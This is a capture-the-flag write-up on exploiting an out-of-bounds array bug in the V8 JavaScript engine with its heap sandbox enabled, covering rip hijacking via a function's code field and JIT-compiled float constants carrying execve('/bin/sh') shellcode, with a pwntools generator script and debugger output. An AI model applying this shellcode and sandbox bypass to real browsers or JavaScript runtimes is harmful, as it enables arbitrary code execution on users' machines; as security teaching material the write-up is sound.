---
layout: post
title:  "Dice CTF Memory Hole: Breaking V8 Heap Sandbox"
date:   2022-02-06 00:00:00 +0000
categories: jekyll update
---

## 0x00 Introduction

In this challenge, we need to exploit V8 JavaScript engine with heap sandbox enabled. The bug is very simple: an array OOB. We bypass the sandbox by rewriting `code` field of function object, so that we can control the low 32 bits of `rip` register. We write the shellcode as double floating point immediate numbers in function and compile this function using JIT, and set `rip` to address of the shellcode to execute `execve`.

## 0x01 Sandbox Overview

The detail of the sandbox is [here](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#), but I will not detail it here. One important protection is that it converts all external pointers to indexes of a lookup table, such as pointer to web assembly RWX page and pointer of `ArrayBuffer` backing store. Thus, we cannot use normal approach to achieve arbitrary read and write.

## 0x02 Approach

### Hijacking Program Counter

If we `%DebugPrint` a function object, we can see there is a `code` field pointing to an object at a `r-x` page. If we type `job` command to that `code` field, we can see many assembly instructions. These are exactly the instructions that will be executed if the function is called.

```
pwndbg> job 0x7fb0804ad55
0x7fb0804ad55: [Function]
 - map: 0x07fb082022c1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 ...
 - code: 0x07fb00004f01 <Code BUILTIN CompileLazy>  <---- code field
 ...
pwndbg> job 0x07fb00004f01
...
Instructions (size = 1112)
0x7fb07e8d6c0     0  55                   push rbp
0x7fb07e8d6c1     1  4889e5               REX.W movq rbp,rsp
...
```

We can verify this by setting a break point at `0x7fb07e8d6c0` and call the function in JavaScript. We can see the breakpoint is triggered in debugger.

Therefore, we can try to modify this field to see if we can hijack `rip` when this JavaScript function is called. We set the `code` field to `0x414141` using `gdb` `set` command, and call this function in JavaScript. We can see a crash at following location:

```assembly
 ► 0x7fb07e8206b    test   dword ptr [rcx + 0x1b], 0x20000000
   0x7fb07e82072    jne    0x7fb07e82081 <0x7fb07e82081>

   0x7fb07e82078    add    rcx, 0x3f
   0x7fb07e8207c    jmp    0x7fb07e8208c <0x7fb07e8208c>
    ↓
   0x7fb07e8208c    jmp    rcx
```

The value of `rcx` is `0x7fb00414141`, which is base address plus the value we have provided.

Looking at the assembly code where the crash occurs, we can conclude that if `dword ptr [rcx + 0x1b] & 0x20000000` is zero, `rip` will be set to `rcx + 0x3f`, which is an easily satisfiable condition.

### Writing Shellcode with Immediate Numbers

Unlike web assembly, whose JIT code is stored in region outside the V8 heap, the normal JavaScript function store the JIT code inside the V8 heap (e.i. the 32-bit region starting with the base address, read [this](https://v8.dev/blog/pointer-compression) for more details). We can see this also by looking at `code` field of a JITed JavaScript function object.

```javascript
const foo = () =>
{
	return [1.1, 2.2, 3.3];
}
%PrepareFunctionForOptimization(foo);
foo();
%OptimizeFunctionOnNextCall(foo);
foo();
%DebugPrint(foo);
readline();
```

```
DebugPrint: 0x29820804ae0d: [Function]
 - map: 0x2982082022c1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 ...
 - code: 0x298200044001 <Code TURBOFAN>
 ...
 
pwndbg> job 0x298200044001
0x298200044001: [Code]
...
Instructions (size = 304)
0x298200044040     0  8b59d0               movl rbx,[rcx-0x30]
...
0x29820004409f    5f  49ba9a9999999999f13f REX.W movq r10,0x3ff199999999999a
0x2982000440a9    69  c4c1f96ec2           vmovq xmm0,r10
0x2982000440ae    6e  c5fb114107           vmovsd [rcx+0x7],xmm0
0x2982000440b3    73  49ba9a99999999990140 REX.W movq r10,0x400199999999999a
0x2982000440bd    7d  c4c1f96ec2           vmovq xmm0,r10
0x2982000440c2    82  c5fb11410f           vmovsd [rcx+0xf],xmm0
0x2982000440c7    87  49ba6666666666660a40 REX.W movq r10,0x400a666666666666
...
```

As we can see in the JIT code, the IEEE representations of `1.1`, `2.2` and `3.3` are compiled to `r-x` page inside the V8 heap region. We can write shellcode using these numbers and connect them with a `jmp` instruction. Since `jmp` instruction consumes 2 bytes, we have 6 bytes for shellcode, which are definitely enough.

Therefore, we can set `rip` to the shellcode using the method mentioned in last subsection. The condition can be easily satisfied by putting a `1.0` at first element of array.

We generate the shellcode with following scripts, and convert the hex numbers into IEEE floating point numbers using this [website](https://www.binaryconvert.com/convert_double.html):

```python
from pwn import *

context(arch='amd64')
jmp = b'\xeb\x0c'
shell = u64(b'/bin/sh\x00')

def make_double(code):
	assert len(code) <= 6
	print(hex(u64(code.ljust(6, b'\x90') + jmp))[2:])

make_double(asm("push %d; pop rax" % (shell >> 0x20)))
make_double(asm("push %d; pop rdx" % (shell % 0x100000000)))
make_double(asm("shl rax, 0x20; xor esi, esi"))
make_double(asm("add rax, rdx; xor edx, edx; push rax"))
code = asm("mov rdi, rsp; push 59; pop rax; syscall")
assert len(code) <= 8
print(hex(u64(code.ljust(8, b'\x90')))[2:])

"""
Output:
ceb580068732f68
ceb5a6e69622f68
cebf63120e0c148
ceb50d231d00148
50f583b6ae78948
"""
```

The final function that can generate the shellcode is shown below:

```javascript
const foo = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
```

Another thing to note is that we must put the immediate numbers as elements of array, instead of using them in other ways like `func(1.1, 2.2)`. The later one will generate JIT code that loads floating point numbers as `HeapNumber`, so that the immediate numbers cannot be compiled into `r-x` page.

Also, JIT compiling `foo` with loop can trigger garbage collection, so that we must compile it before triggering any vulnerability.

### Arbitrary Read and Write within V8 Heap Region using TypedArray

Finally, we need to use the vulnerability to actually implement the idea mentioned above. We found that we can still use `TypedArray` to achieve arbitrary read and write within V8 heap region (e.i. 32-bit region starting with the base address). Therefore, we use array OOB write to rewrite field of `Uint32Array` to achieve this arbitrary read and write. We also use array OOB read to leak addresses of related function objects. The full exploit is [here](https://github.com/Mem2019/Mem2019.github.io/blob/master/codes/memory-hole-1984.js).
